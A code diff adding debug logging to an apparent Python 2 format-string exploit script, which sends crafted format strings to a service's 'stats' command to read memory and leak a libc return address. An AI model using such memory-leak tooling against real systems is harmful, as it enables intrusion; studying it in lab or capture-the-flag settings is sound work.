@@ -2,6 +2,7 @@ import puppeteer
 import socket
 
 import logging
+import standard_logging
 
 class Aggravator(puppeteer.Manipulator):
     def __init__(self, host, port):
@@ -19,6 +20,7 @@ class Aggravator(puppeteer.Manipulator):
 
     @puppeteer.printf_flags(byte_offset=244, max_length=31)
     def stats_printf(self, fmt):
+        print "Sending:",fmt
         self.s.sendall("stats " + fmt + "\n")
         puppeteer.read_until(self.s, "kill top:\n")
         try:
@@ -27,6 +29,8 @@ class Aggravator(puppeteer.Manipulator):
         except EOFError:
             print "Program didn't finish the print"
             return ""
+
+        print "RECEIVED:",result
         return result
 
 def main():
@@ -45,7 +49,6 @@ def main():
     #print "LOOK WHAT WE CAN READ!!", a.do_memory_read(0x0804AAAA, 20)
 
     ## We can figure out where __libc_start_main is!
-    #lcsm = a.main_return_address(start_offset=390)
     lcsm = a.main_return_address(start_offset=390)
     print "main() will return to (presumably, this is in libc):",hex(lcsm)
 
